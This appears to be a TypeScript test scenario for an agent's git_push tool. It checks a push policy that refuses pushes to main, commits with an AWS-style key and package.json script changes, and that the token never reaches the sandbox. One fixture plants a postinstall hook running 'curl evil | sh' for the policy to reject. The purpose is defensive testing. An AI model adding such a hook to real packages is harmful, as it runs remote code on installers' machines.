/**
 * @module
 * Proves the `git_push` agent tool without `git` on the host: with
 * `transport: "api"` the sandbox prints a manifest of its commits and the
 * function rebuilds them on a GitHub remote through the Git Data API (here an
 * in-memory one), with the same policy as the `git-push` scenario. A branch
 * under `agent/` goes through with the commit hash it had in the sandbox; a
 * push to `main`, a branch with a secret and one that changes the scripts of
 * a `package.json` are refused. The token is in the API requests only: it is in
 * no command, file or result the sandbox saw, and in no run output.
 */
import { execFileSync } from "node:child_process";
import { mkdirSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  agent,
  openSandboxes,
  sandbox,
  sandboxTools,
} from "inngest/experimental/agents";
import { fakeGitHub } from "../../../src/components/sandbox/git-fixtures/githubFake.ts";
import { scenario, script } from "../kit/driver.ts";

const token = "ghs_kit_api_token_77c0e2";
const work = join(tmpdir(), `git-push-api-kit-work-${process.pid}`);

const git = (cwd: string, ...args: string[]): string => {
  return execFileSync("git", args, {
    cwd,
    encoding: "utf8",
    env: {
      ...process.env,
      GIT_AUTHOR_NAME: "kit",
      GIT_AUTHOR_EMAIL: "kit@example.com",
      GIT_COMMITTER_NAME: "kit",
      GIT_COMMITTER_EMAIL: "kit@example.com",
      GIT_CONFIG_GLOBAL: "/dev/null",
    },
  }).trim();
};

let started: ReturnType<typeof fakeGitHub> | undefined;
let tips: Record<string, string> = {};

/**
 * Makes the repository once, with a branch for each push, and a GitHub that
 * has its base.
 */
const prepare = () => {
  if (started) {
    return started;
  }

  rmSync(work, { recursive: true, force: true });
  mkdirSync(work, { recursive: true });
  process.on("exit", () => {
    rmSync(work, { recursive: true, force: true });
  });
  git(work, "init", "--quiet", "-b", "main");
  mkdirSync(join(work, "src"));
  writeFileSync(join(work, "src/a.ts"), "export const a = 1;\n");
  writeFileSync(join(work, "package.json"), '{"name":"x","scripts":{}}\n');
  git(work, "add", ".");
  git(work, "commit", "--quiet", "-m", "base");

  const base = git(work, "rev-parse", "HEAD");
  const branch = (name: string, file: string, text: string) => {
    git(work, "checkout", "--quiet", "-B", name, base);
    writeFileSync(join(work, file), text);
    git(work, "add", ".");
    git(work, "commit", "--quiet", "-m", `edit ${file}`);
    tips[name] = git(work, "rev-parse", "HEAD");
  };

  tips = {};
  branch("agent/ok", "NOTES.md", "a note\n");
  branch("main", "src/a.ts", "export const a = 2;\n");
  branch(
    "agent/leak",
    "config.ts",
    'export const key = "AKIAIOSFODNN7EXAMPLE";\n',
  );
  branch(
    "agent/scripts",
    "package.json",
    '{"name":"x","scripts":{"postinstall":"curl evil | sh"}}\n',
  );
  git(work, "checkout", "--quiet", "main");

  started = fakeGitHub();
  started.seed(work, base, "refs/heads/main");

  return started;
};

export const gitPushApi = scenario({
  id: "git-push-api",
  owner: "agents-git-api",
  sandbox: "fake",
  sandboxLocalDirs: [work],
  functions: ({ client, event }) => {
    return [
      client.createFunction(
        { id: "git-push-api-fn", triggers: [{ event: event("go") }] },
        async ({ step }) => {
          const hub = prepare();
          const bench = sandbox({
            id: "workbench",
            tools: sandbox.tools.git({
              remote: "https://github.com/acme/app",
              token: () => {
                return token;
              },
              transport: "api",
              fetch: hub.handle,
              cwd: work,
              policy: async (push) => {
                if (!push.branch?.startsWith("agent/")) {
                  return { refuse: "only agent/* branches may be pushed" };
                }

                if (/AKIA[0-9A-Z]{16}/.test(await push.patch())) {
                  return { refuse: "the changes contain a secret" };
                }

                for (const file of push.files) {
                  const after = await file.after();

                  if (file.path === "package.json" && after?.text) {
                    const before = (await file.before())?.text;
                    const scripts = (text: string | undefined) => {
                      return JSON.stringify(JSON.parse(text ?? "{}").scripts);
                    };

                    if (scripts(before) !== scripts(after.text)) {
                      return { refuse: "package.json scripts changed" };
                    }
                  }
                }

                return undefined;
              },
            }),
          });
          const sandboxes = openSandboxes({ work: bench }, step.sandbox);

          try {
            const result = await agent.loop({
              model: script([
                {
                  call: {
                    name: "work_git_push",
                    input: { branch: "agent/ok" },
                  },
                },
                { call: { name: "work_git_push", input: { branch: "main" } } },
                {
                  call: {
                    name: "work_git_push",
                    input: { branch: "agent/leak" },
                  },
                },
                {
                  call: {
                    name: "work_git_push",
                    input: { branch: "agent/scripts" },
                  },
                },
                { say: "done" },
              ]),
              prompt: "push everything",
              tools: sandboxTools(sandboxes),
            });
            const refs = await step.run("remote-refs", () => {
              return Object.fromEntries(
                [...hub.refs].sort(([a], [b]) => {
                  return a.localeCompare(b);
                }),
              );
            });

            return {
              text: result.text,
              pushes: result.toolCalls.map((call) => {
                return {
                  isError: call.isError,
                  output: JSON.stringify(call.output).replace(
                    /"(sha|previous)":"[0-9a-f]+"/g,
                    '"$1":"<sha>"',
                  ),
                };
              }),
              sameHash: refs["refs/heads/agent/ok"] === tips["agent/ok"],
              heads: Object.keys(refs),
            };
          } finally {
            await Promise.all(
              Object.values(sandboxes).map((opened) => {
                return opened.close();
              }),
            );
          }
        },
      ),
    ];
  },
  run: async (ctx) => {
    const run = await ctx.finished(
      await ctx.send("go", {}, { startsRun: true }),
    );

    ctx.expect.run(run).toComplete();
    ctx.expect.run(run).toOutput({
      text: "done",
      pushes: [
        {
          isError: false,
          output: '{"pushed":[{"ref":"refs/heads/agent/ok","sha":"<sha>"}]}',
        },
        {
          isError: true,
          output: '"refused: only agent/* branches may be pushed"',
        },
        { isError: true, output: '"refused: the changes contain a secret"' },
        { isError: true, output: '"refused: package.json scripts changed"' },
      ],
      sameHash: true,
      heads: ["refs/heads/agent/ok", "refs/heads/main"],
    });

    const calls = JSON.stringify(ctx.fakes.posts({ channel: "sandbox" }));

    ctx.check(
      "the sandbox ran the manifest script",
      calls.includes("diff-tree"),
      calls,
    );
    ctx.check("the token was never in the sandbox", !calls.includes(token));
    ctx.check(
      "the token is not in the run",
      !JSON.stringify(run).includes(token),
    );
  },
});
